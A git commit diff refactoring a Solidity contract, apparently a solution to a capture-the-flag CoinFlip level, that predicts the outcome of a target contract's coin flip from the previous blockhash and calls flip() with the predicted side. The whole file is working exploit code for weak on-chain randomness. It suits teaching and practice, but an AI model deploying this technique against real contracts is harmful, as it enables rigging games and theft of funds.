6cb22f5e278085dcd8894f05ed951da495381592
kedarpujara <kedarpujara@gmail.com>
2022-08-14 19:35:59 -0600

    Fix attacking coin flip

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -6,6 +6,9 @@ contract AttackingCoinFlip {
     address public contractAddress;
     CoinFlip private coinFlipContract;
 
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
         coinFlipContract = CoinFlip(_contractAddress);
@@ -17,9 +20,9 @@ contract AttackingCoinFlip {
          * Pseudocode
          * guess the side correctly based on the same logic in the flip 
          */
-        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-        uint256 coinFlip = uint(blockhash(block.number - 1)) / factor;
-        bool side = coinFlip == 1 ? true : false;
-        coinFlipContract.flip(side);
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool attackingGuess = coinFlip == 1 ? true : false;
+        coinFlipContract.flip(attackingGuess);
     }
 }
